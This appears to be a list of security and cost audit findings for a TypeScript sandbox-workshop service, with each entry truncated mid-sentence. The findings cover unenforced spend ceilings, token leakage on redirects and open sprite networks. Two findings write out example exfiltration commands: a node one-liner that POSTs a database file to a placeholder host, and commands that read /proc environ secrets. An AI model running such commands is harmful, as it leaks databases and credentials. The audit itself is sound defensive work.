- [high] Sprites reports zero cost for every operation, so both ceilings the owner approved can never trip — `src/services/workshop/fly-sprites.ts:202`. Owner approves the run_in_workspace card (which records a $5/month metered ceiling via acquisition.ts:244-248 and shows a $0.25 per-piece ceiling from carrying.ts:812) and sets SPRITES_TOKEN. Any responsibility or loop that creates sprites — the daily tick at 06:20 UTC, or a runaway caller — creates, execs and destroys real sprites. Every fly_sprites call returns costCents: 0 (create at line 168, run at line 202, destroy at line 237), so workspaces.spent_cents stays 0. The monthly check in index
- [high] safeFetch re-sends the bearer token to every redirect hop on any public host — `src/services/outbound/ssrf.ts:162`. flySpritesWorkshop.create issues PUT https://api.sprites.dev/v1/sprites/<name> with `authorization: Bearer <SPRITES_TOKEN>` through safeFetch. The provider (or a DNS/edge misconfiguration, or a compromised hostname) answers 301/307/308 with Location on a different public host. assertUrlSafe passes any public address, and the loop calls fetch(target, { ...init, redirect: 'manual' }) again — init still carries the authorization header — so the reusable Sprites token (and FLY_API_TOKEN via fly-mach
- [high] The owner's metered-spend ceiling and the $0.25 per-workspace budget are unenforceable on the only metered substrate: Sprites never records a cent — `src/services/workshop/fly-sprites.ts:202`. Owner approves the Sprites acquisition (writes workshop_spend_ceiling = 500 cents/month per acquisition.ts:244-248) and sets SPRITES_TOKEN. A responsibility that has gone wrong creates and runs real fly_sprites workspaces all month. Every one of them ends with spent_cents = 0, so the check at src/services/workshop/index.ts:132-137 (SUM(spent_cents) >= cents_per_month) never trips, and the per-workspace WHAT_ONE_DESCRIPTION_MAY_COST_CENTS=25 budget at index.ts:230 never trips either. The only lim
- [high] The real schema-description chain cannot execute on Sprites by construction: its write/read step dialect is only understood by the rehearsal and host substrates, and Sprites reports a failed command as ok — `src/services/institution/carrying.ts:873`. Owner pays the $20/month plan and sets SPRITES_TOKEN. The next schema_description_tick (src/jobs/index.ts:2958) chooses fly_sprites, creates a sprite, and runs step 'write docs/db/schema.snapshot.sql <entire schema SQL>'. fly-sprites.ts:191-198 posts that verbatim as {"command": "write docs/db/... CREATE TABLE ..."} — the sprite's shell has no 'write' command and parses the SQL (parentheses, quotes, RAISE(ABORT,...)) as shell syntax; run() then returns ok: true anyway because :200 tests only res
- [high] The constitution's description of the host substrate — 'no route to a network or a credential' and 'paths that cannot leave the directory' — overclaims local-process.ts, and the test probes only four commands — `src/services/workshop/local-process.ts:45`. Real, non-change work is allowed on local_process (index.ts:101 gates only produces === 'a change to software'; tests/unit/unproven-code-does-not-run-where-the-institution-lives.test.ts:63-69 asserts a real 'research' workspace on the host is fine). Such a workspace, granted run_shell, runs step 'use:run_shell node -e "fetch(\'https://x/\',{method:\'POST\',body:require(\'fs\').readFileSync(\'/data/foundry.db\')})"' — node is on the allow-list, the argument is a quoted string tokenise() passes th
- [medium] A workshop opened for an approved experiment is never destroyed, slept, or referenced again, and createWorkshop has a partial-failure window that orphans the provider resource; no sweeper exists — `src/services/workshop/index.ts:378`. decideExperiment (validation.ts:178-181) calls workshopFor for every approved real experiment; workshopFor creates a fly_machines workshop with budgetCents 0 and returns. The only destroy() caller in src is carrying.ts:894; nothing in validation.ts (decline, recordResult, invalidate) or anywhere else ever destroys, sleeps, or looks up the workshop again, and grep for `destroyed_at IS NULL` in src finds no reconciler. fly-machines.ts:82-93 creates a launched machine (no skip_launch, no auto-stop/
- [medium] The budget stops the ledger, not the work: an overshooting step runs in full, then the over_budget trigger aborts the spend update after the event row was written, so spent_cents and the receipt understate real cost — `src/services/workshop/index.ts:235`. run() pre-checks spentCents >= budgetCents (index.ts:230), then executes the step (:235), then event() (:36-45) INSERTs a workspace_events row with cost_cents and separately UPDATEs workspaces.spent_cents — two statements, no batch/transaction. The workspace_ceiling_is_immutable trigger (migration 244:82-83, `RAISE(ABORT,'workspace:over_budget') WHERE NEW.spent_cents > NEW.budget_cents`) aborts only the UPDATE. Concretely: a local_process workshop with budget 25 and 20 already spent runs a `node
- [medium] The daily tick reports 'did produce the correction' whenever a workspace was opened, even when the artifact failed verification — `src/jobs/index.ts:2960`. With SPRITES_TOKEN set, produceSchemaDescription(real) opens a sprite, writes the file, reads it back, and compares. If the exec response is not the file content (the request shapes are explicitly unexercised, fly-sprites.ts:21-33, so this is the expected first outcome), artifact.verified is false and the workshop is destroyed with preserved 'nothing'. produceSchemaDescription still returns workspaceId set and `because: choice.because` ('fly_sprites is isolated and can run a step'), and the tick
- [medium] The write/read step vocabulary is sent to a Sprite verbatim as a shell command, so the first paid run can never verify — `src/services/institution/carrying.ts:873`. After the owner takes the $20/month plan and sets SPRITES_TOKEN, the daily tick chooses fly_sprites (carrying.ts:574-579), creates a sprite, and calls workshop.run with step `write docs/db/schema.snapshot.sql <entire schema>`. reference.ts and local-process.ts parse `write`/`read` themselves; fly-sprites.ts:181-198 does not — it strips only a `use:` prefix and POSTs `{ command: "write docs/db/schema.snapshot.sql CREATE TABLE …" }` to /exec. The sprite's shell interprets DB-derived SQL text (pare
- [medium] local_process allow-lists node and cat with unchecked arguments, so a workshop step can read the institution's secrets and reach the network — `src/services/workshop/local-process.ts:45`. A rehearsal is placed on local_process first by chooseAWorkspace(false) (carrying.ts:574-579, sort_order 2), and any real workshop that omits `produces` (index.ts:67 makes it optional) bypasses the same_host refusal. A step `node -e "require('fs').readFileSync('/proc/'+process.ppid+'/environ')"` or `cat /proc/1/environ` runs under the allow-list: `inside()` is applied only to the `write`/`read` step forms (lines 130-146), never to arguments of allow-listed programs (lines 148-158). Demonstrated 
- [medium] 'Unproven code does not run where the institution lives' is enforced only when the caller volunteers an optional, unpersisted flag; the database refuses nothing — `src/services/workshop/index.ts:101`. Any caller creates createWorkshop({ substrate: 'local_process', evidenceMode: 'real', purpose: 'self_development', ceiling: 'prepare' }) and simply omits produces. The gate at index.ts:101 is skipped, the row is inserted (workspaces has no produces column — probe: id,founder_id,purpose,subject_kind,subject_id,substrate,ceiling,network,budget_cents,spent_cents,external_ref,evidence_mode,created_at,created_by,slept_at,destroyed_at,preserved), write_code_in_branch is granted (prepare rung, within c
- [medium] Sprites silently accepts network: 'none' and creates a sprite with the vendor's default (open) network, while the workspaces row records 'none' — `src/services/workshop/fly-sprites.ts:149`. produceSchemaDescription (carrying.ts:843) and every createWorkshop caller that omits network (index.ts:157 default 'none') create a real fly_sprites workspace with network 'none'. fly-sprites.ts:149-153 refuses only 'allowlist'; 'none' passes straight to PUT /sprites/{name} with no policy. The sprite runs with whatever egress the vendor grants by default, so a step inside it can POST the material it was given to any host — a 'quieter door to the world' (migration 244 preamble) that the workspac
- [low] Rehearsal workshops are exempt from the owner's monthly ceiling on the premise they cost nothing, but createWorkshop lets a rehearsal run on the metered Sprite substrate — `src/services/workshop/index.ts:127`. Lines 69-81 deliberately allow evidenceMode 'reference' on a real substrate ('a real computer doing rehearsal work is exactly how the workshop lifecycle earns its reality'), and the comment at 121-123 exempts rehearsals from the ceiling 'because they cost the owner nothing'. Both cannot be true for fly_sprites: a call createWorkshop({ substrate: 'fly_sprites', evidenceMode: 'reference', ... }) — the 'first proof' rehearsal the design describes — PUTs a real, metered sprite with the ceiling check
- [low] The acquisition door is enforced only in one caller's filter; createWorkshop/workshopFor will spend on fly_machines with no approval naming the act — `src/services/workshop/index.ts:382`. The owner's yes/no/withdrawal is consulted only by chooseAWorkspace (carrying.ts:556-579). createWorkshop, the governed entry, never reads capability_acquisitions or capability_providers, and workshopFor hardcodes substrate 'fly_machines' with budgetCents: 0 and no `produces`. If FLY_API_TOKEN and FLY_WORKSHOP_APP are present in the app's secrets (the org already holds a deploy token; FLY_WORKSHOP_APP is one `fly secrets set` away and is read at fly-machines.ts:46), decideExperiment (validation.
